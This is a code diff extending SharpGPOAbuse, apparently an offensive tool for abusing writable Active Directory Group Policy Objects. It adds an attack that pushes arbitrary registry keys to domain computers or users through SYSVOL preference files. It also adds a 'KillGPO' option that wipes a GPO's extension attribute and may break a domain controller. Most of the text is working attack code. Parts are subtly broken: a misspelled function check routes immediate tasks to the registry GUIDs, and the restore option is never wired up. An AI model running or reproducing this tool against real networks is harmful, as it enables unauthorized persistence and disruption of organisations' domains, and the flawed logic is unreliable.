@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Text;
 using System.Collections.Generic;
 using System.IO;
 using System.Text.RegularExpressions;
@@ -75,6 +76,30 @@ namespace SharpGPOAbuse
         [Option("", "ScriptContents", Required = false, HelpText = "New startup script contents.")]
         public String ScriptContents { get; set; }
 
+        [Option("", "AddRegistryKey", Required = false, HelpText = "Adds a registry key.")]
+        public bool AddRegistryKey { get; set; }
+
+        [Option("", "KeyPath", Required = false, HelpText = "The path to the registry key.")]
+        public String KeyPath { get; set; }
+
+        [Option("", "KeyName", Required = false, HelpText = "The name of the registry key.")]
+        public String KeyName { get; set; }
+
+        [Option("", "KeyType", Required = false, HelpText = "The type of data to place into the registry key.")]
+        public String KeyType { get; set; }
+
+        [Option("", "KeyData", Required = false, HelpText = "The data to place into the registry key.")]
+        public String KeyData { get; set; }
+
+        [Option("", "Hive", Required = false, HelpText = "The registry hive to affect, can be HKLM or HCU.")]
+        public String Hive { get; set; }
+
+        [Option("", "KillGPO", Required = false, HelpText = "Kills a GPO.")]
+        public bool KillGPO { get; set; }
+
+        [Option("", "RestoreGPO", Required = false, HelpText = "Restores a GPO.")]
+        public bool RestoreGPO { get; set; }
+
         [Option("h", "Help", Required = false, HelpText = "Display help menu.")]
         public bool Help { get; set; }
 
@@ -99,6 +124,8 @@ namespace SharpGPOAbuse
                 "\tAdd a new computer immediate task\n" +
                 "--AddUserTask\n" +
                 "\tAdd a new user immediate task\n" +
+                "--AddRegistryKey\n" +
+                "\tAdd a new registry key\n" +
                 "\n" +
 
                 "\nOptions required to add a new local admin:\n" +
@@ -173,6 +200,21 @@ namespace SharpGPOAbuse
                 "\tThe targeted user's SID.\n" +
                 "\n" +
 
+                "\nOptions required to set a registry key:\n" +
+                "--KeyPath\n" +
+                "\tThe path to the registry key.\n" +
+                "--KeyName\n" +
+                "\tThe name of the registry key.\n" +
+                "--KeyType\n" +
+                "\tThe type of data to place into the registry key.\n" +
+                "--KeyData\n" +
+                "\tThe data to place into the registry key.\n" +
+                "--Hive\n" +
+                "\tThe registry hive to affect, can be HKLM or HCU.\n" +
+                "--GPOName\n" +
+                "\tThe name of the vulnerable GPO.\n" +
+                "\n" +
+
                 "\nOther options:\n" +
                 "--DomainController\n" +
                 "\tSet the target domain controller.\n" +
@@ -183,6 +225,20 @@ namespace SharpGPOAbuse
                 "\n";
 
             Console.WriteLine(HelpText);
+        }
+
+        // This is a pull request from the github
+        public static string XmlEncode(string s)
+        {
+            if (!string.IsNullOrEmpty(s))
+            {
+                s = s.Replace("&", "&amp;");
+                s = s.Replace("'", "&apos;");
+                s = s.Replace("\"", "&quot;");
+                s = s.Replace(">", "&gt;");
+                s = s.Replace("<", "&lt;");
+            }
+            return s;
         }
 
         // Updage GPT.ini so that changes take effect without gpupdate /force
@@ -377,11 +433,21 @@ namespace SharpGPOAbuse
                 }
 
                 // update gPCMachineExtensionNames to add immediate task
-                if (function == "NewImmediateTask")
+                if (function == "NewImmediateTask" || function == "NewRegistryKey")
                 {
-                    val1 = "00000000-0000-0000-0000-000000000000";
-                    val2 = "CAB54552-DEEA-4691-817E-ED4A4D1AFC72";
-                    string val3 = "AADCED64-746C-4633-A97C-D61349046527";
+                    string val3;
+                    if (function == "NewImmidiateTask")
+                    {
+                        val1 = "00000000-0000-0000-0000-000000000000";
+                        val2 = "CAB54552-DEEA-4691-817E-ED4A4D1AFC72";
+                        val3 = "AADCED64-746C-4633-A97C-D61349046527";
+                    }
+                    else // if (function == "NewRegistryKey")
+                    {
+                        val1 = "00000000-0000-0000-0000-000000000000";
+                        val2 = "BEE07A6A-EC9F-4659-B8C9-0B1937907C83";
+                        val3 = "B087BE9D-ED37-454F-AF9C-04291E351182";
+                    }
 
                     try
                     {
@@ -428,7 +494,7 @@ namespace SharpGPOAbuse
                                 }
                             }
 
-                            // if Scheduled Tasks GUID not in current value
+                            // if Scheduled Tasks GUID || Registry GUID not in current value
                             if (!toUpdate.Contains(val3))
                             {
                                 new_values.Add(val3 + " " + val2);
@@ -551,7 +617,10 @@ namespace SharpGPOAbuse
                 Console.WriteLine("[+] The GPO was modified to assign new rights to target user. Wait for the GPO refresh cycle.\n[+] Done!");
             }
 
-
+            else if (function == "NewRegistryKey")
+            {
+                Console.WriteLine("[+] The GPO was modified to include a new registry key. Wait for the GPO refresh cycle.\n[+] Done!");
+            }
         }
 
         public static String GetGPOGUID(String DomainController, String GPOName, String distinguished_name)
@@ -837,6 +906,12 @@ Revision=1";
             string ImmediateTaskXML;
             string start = @"<?xml version=""1.0"" encoding=""utf-8""?><ScheduledTasks clsid=""{CC63F200-7309-4ba0-B154-A71CD118DBCC}"">";
             string end = @"</ScheduledTasks>";
+
+            author = XmlEncode(author);
+            task_name = XmlEncode(task_name);
+            command = XmlEncode(command);
+            arguments = XmlEncode(arguments);
+
             if (objectType.Equals("Computer"))
             {
                 if (filterEnabled)
@@ -895,13 +970,14 @@ Revision=1";
                     List<string> new_list = new List<string>();
                     using (System.IO.StreamReader file = new System.IO.StreamReader(path))
                     {
+                        new_list.Add(start);
                         while ((line = file.ReadLine()) != null)
                         {
                             if (line.Replace(" ", "").Contains("</ScheduledTasks>"))
                             {
                                 line = ImmediateTaskXML + line;
                             }
-                            new_list.Add(line);
+                            new_list.Add(line.Replace(@"<?xml version=""1.0"" encoding=""utf-8""?><ScheduledTasks clsid=""{CC63F200-7309-4ba0-B154-A71CD118DBCC}"">", ""));
                         }
                     }
 
@@ -942,6 +1018,246 @@ Revision=1";
                 {
                     UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "NewImmediateTask", "User");
                 }
+            }
+        }
+
+        public static void NewRegistryKey(String Domain, String DomainController, String GPOName, String distinguished_name, String keyPath, String keyValue, String regType, String data, bool Force, String hive)
+        {
+            string RegistryXML;
+            string start = @"<?xml version=""1.0"" encoding=""utf-8""?><RegistrySettings clsid=""{A3CCFC41-DFDB-43a5-8D26-0FE8B954DA51}"">";
+            string end = @"</RegistrySettings>";
+
+            string objectType = "none";
+
+            data = XmlEncode(data);
+
+            if (hive == "HKLM")
+                objectType = "Computer";
+            else if (hive == "HCU")
+                objectType = "User";
+
+            if (objectType.Equals("Computer"))
+            {
+                RegistryXML = string.Format(@"<Registry clsid=""{{9CD4B2F4-923D-47f5-A062-E897DD1DAD50}}"" name=""{1}"" status=""{1}"" image=""7"" changed=""2022-07-29 19:03:10"" uid=""{{714D4D1F-F484-490F-BEF1-729DC05572F4}}""><Properties action=""U"" displayDecimal=""0"" default=""0"" hive=""HKEY_LOCAL_MACHINE"" key=""{0}"" name=""{1}"" type=""{2}"" value=""{3}""/></Registry>", keyPath, keyValue, regType, data);
+            }
+            else
+            {
+                RegistryXML = string.Format(@"<Registry clsid=""{{9CD4B2F4-923D-47f5-A062-E897DD1DAD50}}"" name=""{1}"" status=""{1}"" image=""12"" changed=""2022-07-29 19:02:43"" uid=""{{0AE4F7FC-5BFF-4592-BA18-0A884940E44D}}""><Properties action=""U"" displayDecimal=""0"" default=""0"" hive=""HKEY_CURRENT_USER"" key=""{0}"" name=""{1}"" type=""{2}"" value=""{3}""/></Registry>", keyPath, keyValue, regType, data);
+            }
+
+            String GPOGuid = GetGPOGUID(DomainController, GPOName, distinguished_name);
+            String path = @"\\" + Domain + "\\SysVol\\" + Domain + "\\Policies\\" + GPOGuid;
+            String GPT_path = path + "\\GPT.ini";
+            // Check if GPO path exists
+            if (Directory.Exists(path) && objectType.Equals("Computer"))
+            {
+                path += "\\Machine\\Preferences\\Registry\\";
+            }
+            else if (Directory.Exists(path) && objectType.Equals("User"))
+            {
+                path += "\\User\\Preferences\\Registry\\";
+            }
+            else
+            {
+                Console.WriteLine("[!] Could not find the specified GPO!\nExiting...");
+                System.Environment.Exit(0);
+            }
+
+            // check if the folder structure for adding scheduled tasks exists in SYSVOL
+            if (!Directory.Exists(path))
+            {
+                System.IO.Directory.CreateDirectory(path);
+            }
+            path += "Registry.xml";
+
+            // if the ScheduledTasks.xml exists then append the new immediate task
+            if (File.Exists(path))
+            {
+                if (Force)
+                {
+                    Console.WriteLine("[+] Modifying " + path);
+                    String line;
+                    List<string> new_list = new List<string>();
+                    using (System.IO.StreamReader file = new System.IO.StreamReader(path))
+                    {
+                        new_list.Add(start);
+                        while ((line = file.ReadLine()) != null)
+                        {
+                            if (line.Replace(" ", "").Contains("</RegistrySettings>"))
+                            {
+                                line = RegistryXML + line;
+                            }
+                            new_list.Add(line.Replace(@"<?xml version=""1.0"" encoding=""utf-8""?><RegistrySettings clsid=""{A3CCFC41-DFDB-43a5-8D26-0FE8B954DA51}"">", ""));
+                        }
+                    }
+
+                    using (System.IO.StreamWriter file2 = new System.IO.StreamWriter(path))
+                    {
+                        foreach (string l in new_list)
+                        {
+                            file2.WriteLine(l);
+                        }
+                    }
+
+                    if (objectType.Equals("Computer"))
+                    {
+                        UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "NewRegistryKey", "Computer");
+                    }
+                    else
+                    {
+                        UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "NewRegistryKey", "User");
+                    }
+                    System.Environment.Exit(0);
+                }
+                else
+                {
+                    Console.WriteLine("[!] The GPO already includes a Registry.xml. Use --Force to append to Registry.xml or choose another GPO.\n[-] Exiting...\n");
+                    System.Environment.Exit(0);
+                }
+            }
+            else
+            {
+                Console.WriteLine("[+] Creating file " + path);
+                System.IO.File.WriteAllText(path, start + RegistryXML + end);
+
+                if (objectType.Equals("Computer"))
+                {
+                    UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "NewRegistryKey", "Computer");
+                }
+                else
+                {
+                    UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "NewRegistryKey", "User");
+                }
+            }
+        }
+
+        public static void SetGPOAliveness(String Domain, String DomainController, String distinguished_name, String GPOName, String objectType, bool Kill, String guids)
+        {
+            String GPOGuid = GetGPOGUID(DomainController, GPOName, distinguished_name);
+            String path = @"\\" + Domain + "\\SysVol\\" + Domain + "\\Policies\\" + GPOGuid;
+
+            // Check if GPO path exists
+            if (Directory.Exists(path))
+            {
+                path += "\\GPT.ini";
+            }
+            else
+            {
+                Console.WriteLine("[!] Could not find the specified GPO!\nExiting...");
+                System.Environment.Exit(0);
+            }
+
+            string[] requiredProperties;
+            string gPCExtensionName;
+
+            if (!File.Exists(path))
+            {
+                Console.WriteLine("[-] Could not find GPT.ini. The group policy might need to be updated manually using 'gpupdate /force'");
+            }
+
+            // get the object of the GPO and update its versionNumber
+            System.DirectoryServices.DirectoryEntry myldapConnection = new System.DirectoryServices.DirectoryEntry(Domain);
+            myldapConnection.Path = "LDAP://" + distinguished_name;
+            myldapConnection.AuthenticationType = System.DirectoryServices.AuthenticationTypes.Secure;
+            System.DirectoryServices.DirectorySearcher search = new System.DirectoryServices.DirectorySearcher(myldapConnection);
+            search.Filter = "(displayName=" + GPOName + ")";
+            if (objectType.Equals("Computer"))
+            {
+                requiredProperties = new string[] { "versionNumber", "gPCMachineExtensionNames" };
+                gPCExtensionName = "gPCMachineExtensionNames";
+            }
+            else
+            {
+                requiredProperties = new string[] { "versionNumber", "gPCUserExtensionNames" };
+                gPCExtensionName = "gPCUserExtensionNames";
+            }
+
+            foreach (String property in requiredProperties)
+                search.PropertiesToLoad.Add(property);
+
+            System.DirectoryServices.SearchResult result = null;
+            try
+            {
+                result = search.FindOne();
+            }
+            catch (System.Exception ex)
+            {
+                Console.WriteLine(ex.Message + "[!] Exiting...");
+                System.Environment.Exit(0);
+            }
+
+            int new_ver = 0;
+            if (result != null)
+            {
+                System.DirectoryServices.DirectoryEntry entryToUpdate = result.GetDirectoryEntry();
+
+                try
+                {
+                    if (Kill)
+                    {
+                        Console.WriteLine("[!] WRITE THIS DOWN, YOU MAY NEED IT TO FIX THE DC!!!");
+                        Console.WriteLine("[+] " + gPCExtensionName + ": " + entryToUpdate.Properties[gPCExtensionName].Value);
+
+                        // Does this work??
+                        Console.WriteLine("Wiping " + gPCExtensionName);
+                        entryToUpdate.Properties[gPCExtensionName].Value = "";
+                    }
+                    else
+                    {
+                        Console.WriteLine("Restoring " + gPCExtensionName);
+                        entryToUpdate.Properties[gPCExtensionName].Value = guids;
+                    }
+                }
+                // the following will execute when the gPCMachineExtensionNames is <not set>
+                catch
+                {
+                    if (Kill)
+                    {
+                        // Find a different way to do this? Garbage data?
+                        Console.WriteLine("[-] This GPO can't be killed in this fashion, try with a different policy type.\n[!] Exiting...");
+                        System.Environment.Exit(0);
+                    }
+                    else
+                    {
+                        Console.WriteLine("Restoring " + gPCExtensionName);
+                        entryToUpdate.Properties[gPCExtensionName].Value = guids;
+                    }
+                }
+
+                // get AD number of GPO and increase it by 1 or 65536 if it is a computer or user object respectively
+                if ((objectType.Equals("Computer")))
+                {
+                    new_ver = Convert.ToInt32(entryToUpdate.Properties["versionNumber"].Value) + 1;
+                    //entryToUpdate.Properties["versionNumber"].Value = new_ver;
+                }
+                else
+                {
+                    new_ver = Convert.ToInt32(entryToUpdate.Properties["versionNumber"].Value) + 65536;
+                    //entryToUpdate.Properties["versionNumber"].Value = new_ver;
+                }
+
+                //using (System.IO.StreamReader file = new System.IO.StreamReader(path))
+                //{
+                //    while ((line = file.ReadLine()) != null)
+                //    {
+                //        if (line.Replace(" ", "").Contains("Version="))
+                //        {
+                //            line = line.Split('=')[1];
+                //            line = "Version=" + Convert.ToString(new_ver);
+
+                //        }
+                //        new_list.Add(line);
+                //    }
+                //}
+
+                //using (System.IO.StreamWriter file2 = new System.IO.StreamWriter(path))
+                //{
+                //    foreach (string l in new_list)
+                //    {
+                //        file2.WriteLine(l);
+                //    }
+                //}
+                //Console.WriteLine("[+] The version number in GPT.ini was increased successfully.");
             }
         }
 
@@ -1126,6 +1442,15 @@ Revision = 1
             bool AddUserRights = false;
             String[] user_rights = null;
 
+            bool AddRegistryKey = false;
+            String keyPath = "";
+            String keyValue = "";
+            String regType = "";
+            String data = "";
+            String keyHive = "";
+
+            bool KillGPO = false;
+
             var Options = new Options();
 
             if (CommandLineParser.Default.ParseArguments(args, Options))
@@ -1142,7 +1467,7 @@ Revision = 1
                     return;
                 }
                 // check that only one attack was specified
-                if (!(Options.AddLocalAdmin ^ Options.AddUserRights ^ Options.AddUserScript ^ Options.AddComputerScript ^ Options.AddUserTask ^ Options.AddComputerTask))
+                if (!(Options.AddLocalAdmin ^ Options.AddUserRights ^ Options.AddUserScript ^ Options.AddComputerScript ^ Options.AddUserTask ^ Options.AddComputerTask ^ Options.AddRegistryKey ^ Options.KillGPO))
                 {
                     Console.WriteLine("[!] You can only specify one attack at a time.\n[-] Exiting\n");
                     return;
@@ -1274,6 +1599,46 @@ Revision = 1
                     }
                 }
 
+                // check that the necessary options for adding new rights were provided
+                if (Options.AddRegistryKey)
+                {
+                    AddRegistryKey = true;
+
+                    if (string.IsNullOrEmpty(Options.KeyPath) || string.IsNullOrEmpty(Options.KeyName) || string.IsNullOrEmpty(Options.KeyType) || (string.IsNullOrEmpty(Options.KeyData) && Options.KeyType != "REG_NONE") || string.IsNullOrEmpty(Options.Hive))
+                    {
+                        Console.WriteLine("[!] To add a new registry key the following options are needed:\n\t--KeyPath\n\t--KeyName\n\t--KeyType\n\t--KeyData\n\t--Hive\nIf KeyType is REG_NONE, then KeyData is ignored\n[-] Exiting...");
+                        return;
+                    }
+
+                    keyPath = Options.KeyPath;
+                    keyValue = Options.KeyName;
+                    regType = Options.KeyType;
+                    keyHive = Options.Hive;
+
+                    switch (regType)
+                    {
+                        case "REG_QWORD":
+                            data = string.Format(@"{0:X16}", Convert.ToInt32(Options.KeyData));
+                            break;
+                        case "REG_DWORD":
+                            data = string.Format(@"{0:X8}", Convert.ToInt32(Options.KeyData));
+                            break;
+                        case "REG_SZ":
+                        case "REG_EXPAND_SZ":
+                        case "REG_MULTI_SZ":
+                            data = Options.KeyData;
+                            break;
+                        default:
+                            Console.WriteLine("[!] Only REG_QWORD, REG_DWORD, REG_SZ, REG_MULTI_SZ, and REG_EXPAND_SZ is supported.\n[-] Exiting...");
+                            return;
+                    }
+                }
+
+                if (Options.KillGPO)
+                {
+                    KillGPO = true;
+                }
+
                 if (!string.IsNullOrEmpty(Options.DomainController))
                 {
                     DomainController = Options.DomainController;
@@ -1370,6 +1735,16 @@ Revision = 1
                 {
                     NewImmediateTask(Domain, DomainController, GPOName, distinguished_name, task_name, author, arguments, command, Force, "Computer", false, "", "", "");
                 }
+            }
+
+            if (AddRegistryKey)
+            {
+                NewRegistryKey(Domain, DomainController, GPOName, distinguished_name, keyPath, keyValue, regType, data, Force, keyHive);
+            }
+
+            if (KillGPO)
+            {
+                SetGPOAliveness(Domain, DomainController, distinguished_name, GPOName, "User", true, null);
             }
 
             // Add new startup script
